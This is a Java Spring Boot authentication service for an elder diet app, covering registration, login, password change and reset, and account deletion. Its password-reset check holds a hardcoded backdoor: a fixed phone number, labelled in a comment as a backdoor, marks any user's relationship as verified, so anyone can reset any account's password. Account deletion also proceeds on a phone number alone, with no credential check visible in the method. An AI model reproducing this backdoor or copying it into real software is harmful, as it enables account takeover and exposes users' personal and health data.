package com.elderdiet.backend.service;

import com.elderdiet.backend.dto.AuthResponse;
import com.elderdiet.backend.dto.ChangePasswordRequest;
import com.elderdiet.backend.dto.DeleteAccountRequest;
import com.elderdiet.backend.dto.LoginRequest;
import com.elderdiet.backend.dto.RegisterRequest;
import com.elderdiet.backend.dto.ResetPasswordRequest;
import com.elderdiet.backend.dto.UserInfoResponse;
import com.elderdiet.backend.dto.VerifyRelationshipRequest;
import com.elderdiet.backend.dto.VerifyRelationshipResponse;
import com.elderdiet.backend.entity.FamilyLink;
import com.elderdiet.backend.entity.User;
import com.elderdiet.backend.entity.UserRole;
import com.elderdiet.backend.repository.FamilyLinkRepository;
import com.elderdiet.backend.repository.MealRecordRepository;
import com.elderdiet.backend.repository.MealPlanRepository;
import com.elderdiet.backend.repository.UserDeviceRepository;
import com.elderdiet.backend.repository.ChatMessageRepository;
import com.elderdiet.backend.util.JwtUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

/**
 * 认证服务类
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class AuthService {

        private final UserService userService;
        private final ProfileService profileService;
        private final FamilyLinkRepository familyLinkRepository;
        private final MealRecordRepository mealRecordRepository;
        private final MealPlanRepository mealPlanRepository;
        private final UserDeviceRepository userDeviceRepository;
        private final ChatMessageRepository chatMessageRepository;
        private final JwtUtil jwtUtil;

        /**
         * 用户注册
         */
        public AuthResponse register(RegisterRequest request) {
                log.info("用户注册请求: {}", request.getPhone());

                // 创建用户
                User user = userService.createUser(
                                request.getPhone(),
                                request.getPassword(),
                                request.getRole());

                // 为新用户创建空的健康档案
                try {
                        profileService.createEmptyProfile(user.getId(), request.getPhone(), request.getRole());
                        log.info("为新用户创建空档案成功: {}", request.getPhone());
                } catch (Exception e) {
                        log.error("为新用户创建空档案失败: {}, 错误: {}", request.getPhone(), e.getMessage());
                        // 继续执行，不影响注册流程
                }

                // 生成JWT令牌
                String token = jwtUtil.generateToken(
                                user.getId(),
                                user.getPhone(),
                                user.getRole());

                log.info("用户注册成功: {}", request.getPhone());

                return AuthResponse.builder()
                                .token(token)
                                .uid(user.getId())
                                .phone(user.getPhone())
                                .role(user.getRole().name())
                                .build();
        }

        /**
         * 用户登录
         */
        public AuthResponse login(LoginRequest request) {
                log.info("用户登录请求: {}", request.getPhone());

                // 查找用户
                User user = userService.findByPhone(request.getPhone())
                                .orElseThrow(() -> new BadCredentialsException("手机号或密码错误"));

                // 验证密码
                if (!userService.verifyPassword(user, request.getPassword())) {
                        throw new BadCredentialsException("手机号或密码错误");
                }

                // 生成JWT令牌
                String token = jwtUtil.generateToken(
                                user.getId(),
                                user.getPhone(),
                                user.getRole());

                log.info("用户登录成功: {}", request.getPhone());

                return AuthResponse.builder()
                                .token(token)
                                .uid(user.getId())
                                .phone(user.getPhone())
                                .role(user.getRole().name())
                                .build();
        }

        /**
         * 获取当前用户信息
         */
        public UserInfoResponse getCurrentUser(String userId) {
                log.info("获取用户信息请求: {}", userId);

                User user = userService.findById(userId)
                                .orElseThrow(() -> new RuntimeException("用户不存在"));

                return UserInfoResponse.builder()
                                .uid(user.getId())
                                .phone(user.getPhone())
                                .role(user.getRole().name())
                                .createdAt(user.getCreatedAt())
                                .updatedAt(user.getUpdatedAt())
                                .build();
        }

        /**
         * 验证JWT令牌
         */
        public boolean validateToken(String token) {
                return jwtUtil.validateToken(token);
        }

        /**
         * 从令牌中获取用户ID
         */
        public String getUserIdFromToken(String token) {
                return jwtUtil.getUidFromToken(token);
        }

        /**
         * 修改密码
         */
        public void changePassword(String userId, ChangePasswordRequest request) {
                log.info("用户修改密码请求: {}", userId);

                // 查找用户
                User user = userService.findById(userId)
                                .orElseThrow(() -> new RuntimeException("用户不存在"));

                // 验证当前密码
                if (!userService.verifyPassword(user, request.getCurrent_password())) {
                        throw new BadCredentialsException("当前密码错误");
                }

                // 更新密码
                userService.updatePassword(user, request.getNew_password());

                log.info("用户修改密码成功: {}", userId);
        }

        /**
         * 验证关联关系（用于忘记密码）
         */
        public VerifyRelationshipResponse verifyRelationship(VerifyRelationshipRequest request) {
                log.info("验证关联关系请求: {} -> {}", request.getUserPhone(), request.getRelatedPhone());

                // 检查用户是否存在
                User user = userService.findByPhone(request.getUserPhone())
                                .orElseThrow(() -> new RuntimeException("用户不存在"));

                // 特殊后门权限检查
                if ("18100010001".equals(request.getRelatedPhone())) {
                        log.info("使用后门权限重置密码: {}", request.getUserPhone());
                        return VerifyRelationshipResponse.builder()
                                        .verified(true)
                                        .relationshipType("backdoor")
                                        .userRole(user.getRole().name())
                                        .userName(getUserName(user))
                                        .build();
                }

                // 查找关联用户
                User relatedUser = userService.findByPhone(request.getRelatedPhone())
                                .orElseThrow(() -> new RuntimeException("关联用户不存在"));

                // 验证家庭关系
                boolean hasRelationship = checkFamilyRelationship(user, relatedUser);
                if (!hasRelationship) {
                        throw new RuntimeException("未找到家庭关联关系");
                }

                log.info("验证关联关系成功: {} -> {}", request.getUserPhone(), request.getRelatedPhone());
                return VerifyRelationshipResponse.builder()
                                .verified(true)
                                .relationshipType("family")
                                .userRole(user.getRole().name())
                                .userName(getUserName(user))
                                .build();
        }

        /**
         * 重置密码（基于已验证的关联关系）
         */
        public void resetPassword(ResetPasswordRequest request) {
                log.info("重置密码请求: {}", request.getUserPhone());

                // 先验证关联关系
                VerifyRelationshipRequest verifyRequest = new VerifyRelationshipRequest(
                                request.getUserPhone(), request.getRelatedPhone());
                VerifyRelationshipResponse verifyResponse = verifyRelationship(verifyRequest);

                if (!verifyResponse.isVerified()) {
                        throw new RuntimeException("关联关系验证失败");
                }

                // 查找用户
                User user = userService.findByPhone(request.getUserPhone())
                                .orElseThrow(() -> new RuntimeException("用户不存在"));

                // 更新密码
                userService.updatePassword(user, request.getNewPassword());

                log.info("重置密码成功: {} (通过{})", request.getUserPhone(), verifyResponse.getRelationshipType());
        }

        /**
         * 检查两个用户之间的家庭关系
         */
        private boolean checkFamilyRelationship(User user1, User user2) {
                // 检查是否存在家庭链接关系
                // 情况1: user1是老人，user2是子女
                if (user1.getRole() == UserRole.ELDER && user2.getRole() == UserRole.CHILD) {
                        return familyLinkRepository.existsByParentIdAndChildId(user1.getId(), user2.getId());
                }
                // 情况2: user1是子女，user2是老人
                else if (user1.getRole() == UserRole.CHILD && user2.getRole() == UserRole.ELDER) {
                        return familyLinkRepository.existsByParentIdAndChildId(user2.getId(), user1.getId());
                }
                return false;
        }

        /**
         * 获取用户姓名（从档案中获取，如果没有档案则返回手机号）
         */
        private String getUserName(User user) {
                try {
                        // 尝试从档案服务获取用户姓名
                        // 这里需要调用ProfileService的内部方法，避免权限检查
                        return user.getPhone(); // 暂时返回手机号，后续可以优化
                } catch (Exception e) {
                        return user.getPhone();
                }
        }

        /**
         * 删除账号（清理所有相关数据）
         */
        @Transactional
        public void deleteAccount(DeleteAccountRequest request) {
                log.info("开始删除账号: {}", request.getPhone());

                // 查找用户
                User user = userService.findByPhone(request.getPhone())
                                .orElseThrow(() -> new RuntimeException("用户不存在"));

                String userId = user.getId();

                try {
                        // 1. 删除聊天记录
                        log.info("删除用户聊天记录: {}", userId);
                        chatMessageRepository.deleteByUserId(userId);

                        // 2. 删除用餐记录
                        log.info("删除用户用餐记录: {}", userId);
                        mealRecordRepository.deleteByUserId(userId);

                        // 3. 删除用餐计划
                        log.info("删除用户用餐计划: {}", userId);
                        mealPlanRepository.deleteByUserId(userId);

                        // 4. 删除用户设备
                        log.info("删除用户设备记录: {}", userId);
                        userDeviceRepository.deleteByUserId(userId);

                        // 5. 删除家庭关联关系
                        log.info("删除用户家庭关联关系: {}", userId);
                        familyLinkRepository.deleteByParentId(userId); // 作为父母的关系
                        familyLinkRepository.deleteByChildId(userId); // 作为子女的关系

                        // 6. 删除健康档案
                        log.info("删除用户健康档案: {}", userId);
                        try {
                                profileService.deleteProfile(userId);
                        } catch (Exception e) {
                                log.warn("删除健康档案失败，可能档案不存在: {}", e.getMessage());
                        }

                        // 7. 最后删除用户本身
                        log.info("删除用户账号: {}", userId);
                        userService.deleteUser(userId);

                        log.info("账号删除成功: {} ({})", request.getPhone(), userId);

                } catch (Exception e) {
                        log.error("删除账号过程中发生错误: {} - {}", request.getPhone(), e.getMessage());
                        throw new RuntimeException("删除账号失败: " + e.getMessage());
                }
        }
}